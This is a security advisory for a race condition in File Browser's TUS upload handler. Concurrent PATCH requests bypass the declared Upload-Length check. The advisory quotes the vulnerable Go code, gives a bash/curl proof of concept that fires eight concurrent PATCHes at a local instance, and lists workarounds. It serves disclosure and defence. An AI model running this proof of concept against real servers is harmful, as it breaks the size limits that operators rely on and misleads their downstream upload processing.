# GHSA-4r8p-gqj2-mwgm / CVE-2026-82238 — Concurrent TUS uploads write past the declared Upload-Length

- Severity: low (CVSS 3.1)
- CWEs: CWE-367
- Affected: github.com/filebrowser/filebrowser/v2 >= 2.24.0, <= 2.63.23
- Published: 2026-08-14T08:09:14Z
- URL: https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4r8p-gqj2-mwgm

---

## Summary

The TUS upload handler enforces the declared `Upload-Length` per request only. Nothing serializes
concurrent `PATCH` requests against a single upload, so two or more PATCHes sent at the same offset all
pass the offset-conflict check before any of them writes, and every body is appended to the file. The
resulting file exceeds its declared length (2× demonstrated), and the upload-completion hook fires for
it. This defeats the per-request bound added in v2.63.19 for GHSA-ffv3-7h97-993q.

Verified at v2.63.23, the final release. The race itself dates to the introduction of TUS in v2.24.0.

## Details

`tusPatchUpload` stats the file and rejects an offset that does not match its size:

```go
// http/tus_handlers.go:237-243
case file.Size != uploadOffset:
	return http.StatusConflict, fmt.Errorf(
		"%s file size doesn't match the provided offset: %d",
		file.RealPath(),
		uploadOffset,
	)
```

then opens the file in append mode and caps the body at the bytes still expected:

```go
// http/tus_handlers.go:245
openFile, err := d.user.Fs.OpenFile(r.URL.Path, os.O_WRONLY|os.O_APPEND, d.settings.FileMode)

// http/tus_handlers.go:265-266
remaining := uploadLength - uploadOffset
bytesWritten, err := io.Copy(openFile, io.LimitReader(r.Body, remaining+1))
```

Two or more concurrent PATCHes at `Upload-Offset: 0` all observe `file.Size == 0` and all pass the
conflict check. `O_APPEND` makes the `Seek` at `:251` a no-op for writes, so every body lands at
end-of-file rather than overwriting. There is no mutex, no offset tracking and no compare-and-swap
anywhere in the stat → check → write window: `UploadCache` records only the declared length. Each winner
that computes `newOffset >= uploadLength` calls `cache.Complete` and fires the `upload` hook:

```go
// http/tus_handlers.go:288-291
if newOffset >= uploadLength {
	cache.Complete(file.RealPath())
	_ = d.RunHook(func() error { return nil }, "upload", r.URL.Path, "", d.user)
}
```

## PoC

Against a stock instance, as a user with create permission:

```bash
# 1. create upload declaring 32 MiB
curl -s -i -X POST "http://127.0.0.1:8099/api/tus/race.bin?override=false" \
  -H "X-Auth: $TOKEN" -H 'Tus-Resumable: 1.0.0' -H 'Upload-Length: 33554432'
# → 201 Created

# 2. fire 8 concurrent PATCHes at offset 0, each with a 32 MiB body
for i in 1 2 3 4 5 6 7 8; do
  curl -s -o /dev/null -w '%{http_code}\n' -X PATCH \
    "http://127.0.0.1:8099/api/tus/race.bin" \
    -H "X-Auth: $TOKEN" -H 'Tus-Resumable: 1.0.0' \
    -H 'Upload-Offset: 0' -H 'Content-Type: application/offset+octet-stream' \
    --data-binary @chunk32m.bin &
done; wait
```

Observed over 2 independent runs: two PATCHes return `204 No Content` with
`Upload-Offset: 33554432`, the rest `409`; the file on disk is 67,108,864 bytes — exactly 2× the declared
length — and the upload hook fired.

The sequential bound still holds: a sequential over-length PATCH returns `413` and the file is truncated;
a sequential PATCH after completion returns `404`. Only the concurrent path bypasses it.

## Impact

An authenticated user with create permission can write a multiple of the declared `Upload-Length` to
disk — N × `Upload-Length` for N racing requests — so the size the server accepted for an upload is not
the size it stores. The completion hook also fires for a file that violates its declared length, which
can mislead operator-configured downstream processing.

## Patches

None. The project is no longer maintained and no fix will ship.

## Workarounds

- Serialize or rate-limit `PATCH /api/tus/*` per user at the reverse proxy, so concurrent PATCHes against
  one upload cannot reach the handler together.
- Bound the storage File Browser writes to with a filesystem quota or a dedicated volume, so an
  over-length file cannot affect the rest of the host.

## Out of scope

Disk exhaustion as such is not treated as the impact here. File Browser has no maximum upload size and no
storage quota, so a user holding Create or Modify permission is already authorized to write files of
arbitrary size within their own scope — the same position taken in GHSA-ffv3-7h97-993q. What this report
establishes is that the declared-length contract can be broken, not a new capacity to fill the disk, and
the severity is rated on that basis. Per-user quotas remain an unimplemented feature request (#711,
#2090, #2179, #2361).

## References

- GHSA-ffv3-7h97-993q — the per-request `Upload-Length` enforcement that this race defeats.
